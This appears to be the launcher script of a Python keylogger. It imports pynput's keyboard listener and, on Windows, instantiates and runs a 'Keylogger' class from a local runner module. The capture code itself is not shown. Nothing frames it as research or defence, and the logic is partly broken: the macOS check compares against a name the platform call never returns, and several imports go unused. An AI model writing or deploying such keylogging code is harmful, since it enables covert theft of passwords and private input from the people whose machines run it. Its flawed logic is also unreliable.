from pynput.keyboard import Listener
from subprocess import call
import time, datetime
import platform

osName = platform.uname().system
if osName == "macOS":
  import macOS_runner
elif osName == "Windows":
  import Windows_runner
  init = Windows_runner.Keylogger()
  print(init.get_os_info())
  init.run()
